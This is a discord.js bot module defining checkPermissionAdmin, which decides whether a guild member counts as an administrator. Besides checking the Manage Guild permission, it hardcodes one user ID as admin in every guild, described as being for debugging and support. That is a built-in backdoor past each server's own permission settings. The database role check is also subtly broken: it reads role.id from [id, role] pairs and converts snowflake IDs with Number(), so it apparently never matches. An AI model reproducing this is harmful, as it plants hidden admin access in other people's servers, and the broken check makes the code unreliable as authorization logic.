const {PermissionsBitField, GuildMember} = require('discord.js')


module.exports = {
    /**
     *
     * @param db
     * @param member {GuildMember}
     * @returns {Promise<boolean>} The status of if the member is an administrative member
     */
    async checkPermissionAdmin(db, member) {
        // Check if the member has edit server permissions.
        if (member.permissions.has(PermissionsBitField.Flags.ManageGuild, true)) return true;

        // Alice is default admin for debugging purposes and support in other guilds.
        if(member.id.toString() === '1057258549727727627') return true;

        // Get all roles from the guild.
        let guildRoles = await db.getRolesForGuild(member.guild.id.toString()).then(roles => roles.filter(item => item.permission >= 4).map(item => {
            return Number(item.roleId);
        }));

        // Check the database to get roles that are allowed for the guild for management.
        for (const role of member.roles.cache) {
            if(guildRoles.includes(role.id)) return true;
        }

        // Everything else has been checked, and the member isn't an admin.
        return false;
    }
};